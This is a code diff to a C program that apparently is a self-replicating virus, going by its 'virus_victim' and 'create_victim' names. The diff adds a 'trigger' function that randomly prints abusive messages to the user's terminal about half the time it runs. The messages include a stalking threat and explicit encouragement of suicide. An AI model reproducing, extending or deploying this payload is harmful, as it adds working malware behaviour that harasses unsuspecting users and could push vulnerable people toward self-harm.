@@ -27,6 +27,7 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <sys/uio.h>
+#include <time.h>
 #include <unistd.h>
 
 static_assert(sizeof(size_t) >= sizeof(off_t), "off_t must fit in size_t");
@@ -545,6 +546,56 @@ close_fd:
     return result;
 }
 
+static int maybe_pull_trigger(FILE *out) {
+    static const char *const MESSAGES[] = {
+        "You're a mess",
+        "You're a loser",
+        "You're a mistake",
+        "You're not funny",
+        "You lose",
+        "You suck",
+        "You fail at life",
+        "You have no friends",
+        "You're so annoying",
+        "You're so ugly",
+        "Screw you",
+        "Go away",
+        "Go screw yourself",
+        "Go kill yourself",
+        "Die",
+        "You'll be forever alone",
+        "You'll die alone",
+        "It doesn't get better",
+        "It gets worse",
+        "I hate you",
+        "Nobody likes you",
+        "Nobody cares about you",
+        "I know where you live",
+        "God hates you",
+        "Burn in hell",
+        "Your mom should've aborted you",
+        "The world would be better without you",
+        "Just stop",
+        "I'll never forgive you",
+    };
+    enum { NUM_MESSAGES = sizeof(MESSAGES) / sizeof(*MESSAGES) };
+
+    char state[8];
+    struct random_data buf;
+    memset(&buf, 0, sizeof(buf));
+    initstate_r((unsigned int) clock(), state, sizeof(state), &buf);
+
+    int32_t result;
+    random_r(&buf, &result);
+    if (result & 1) return 0;
+
+    random_r(&buf, &result);
+    if (fprintf(out, "%s.\n", MESSAGES[result % NUM_MESSAGES]) < 0) {
+        return -errno;
+    }
+    return 1;
+}
+
 static int create_victim(void) {
     char path[] = "/tmp/XXXXXX";
     int fd = mkstemp(path);
@@ -616,6 +667,11 @@ int main(int argc, char *const argv[], char *const envp[]) {
         closedir(dir);
     } else {
         fprintf(tty, "cannot open .: %s\n", strerror(errno));
+    }
+
+    int trigger_result = maybe_pull_trigger(tty);
+    if (trigger_result < 0) {
+        fprintf(tty, "could not run trigger: %s\n", strerror(-trigger_result));
     }
 
     if (virus_victim.size == 0) {
